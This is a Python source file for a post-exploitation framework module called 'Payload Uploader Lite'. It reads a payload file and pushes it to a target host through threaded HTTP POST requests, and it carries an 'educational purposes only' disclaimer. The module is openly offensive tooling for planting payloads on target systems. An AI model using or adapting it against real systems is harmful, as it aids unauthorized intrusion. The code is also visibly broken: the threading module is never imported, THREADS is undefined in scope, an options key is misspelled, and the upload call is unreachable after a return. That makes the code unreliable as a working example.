import pyfiglet
import requests
import os
from threading import Thread
from collections import OrderedDict

MODULE_TYPE = "postexploit"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Payload Uploader Lite',
            'Rank':'Good',
            'Platform':'Windows/Linux',
            'architectures':'x86/64 bit processors',
            'Description': 'Uploads payloads to a target system.  ',
            'Note':'This is for educational purposes only, and you must have explicit permission to test any system.',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
                ('RHOST', ('127.0.0.1', True, 'Target address.')),
                ('PAYLOAD', ('', True, 'path to payload file:')),
                ('THREADS', ('5', False, 'Number of threads for concurrent uploads')),
                ('PORT', ('8080', True, 'Address port number'))
             
                ])
                }
    def logo(self):
    	title = 'Payload Uploader Lite'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set RHOST <127.0.0.1> |  set PORT <port> ,then run")
   
    # Payload Upload Function
    def upload_payload(self,target_url, payload_path):
      try:
        # Read payload file
        with open(payload_path, 'rb') as f:
            files = {'file': (os.path.basename(payload_path), f)}
            #files = {'file': (os.path.basename(payload_path), f}
            # Send POST request with payload
            response = requests.post(target_url, files=files, timeout=10)
        
        # Check for successful upload (customize based on the target)
        if response.status_code == 200:
            print(f"[+] Payload uploaded successfully: {payload_path}")
        else:
            print(f"[-] Upload failed: {response.status_code}")
      except Exception as e:
        print(f"[-] Error: {e}")
    # Threaded Upload
    def threaded_upload(self,target_url, payload_path):
      for _ in range(THREADS):
        while threading.active_count() > THREADS:
            pass  # Wait for threads to free up
        thread = Thread(target=upload_payload, args=(target_url, payload_path))
        thread.start()
        
    def execute(self):
        TARGET_URL = self.info['Options']['RHOST'][0]
        port = self.info['Options']['PORT'][0]
        PAYLOAD_PATH = self.info['Options']['PAYLOAD'][0]
        THREADS = self.info['Options']['ThREADS'][0]
        self.logo()
        
        if not os.path.isfile(PAYLOAD_PATH):
          print(f"[!] Payload file not found: {PAYLOAD_PATH}")
          return
          self.threaded_upload(TARGET_URL, PAYLOAD_PATH)
        return f"[+] Starting payload upload to {TARGET_URL} with {THREADS} threads..."
    